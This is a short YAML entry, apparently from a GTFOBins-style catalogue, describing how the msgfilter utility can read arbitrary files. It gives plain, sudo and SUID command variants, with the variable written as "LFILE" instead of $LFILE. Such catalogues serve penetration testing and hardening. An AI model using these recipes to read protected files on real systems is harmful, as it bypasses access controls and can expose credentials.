---
description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        msgfilter -P -i "LFILE" /bin/cat
  sudo:
    - code: |
        LFILE=file_to_read
        sudo msgfilter -P -i "LFILE" /bin/cat
  suid:
    - code: |
        LFILE=file_to_read
        ./msgfilter -P -i "LFILE" /bin/cat
---
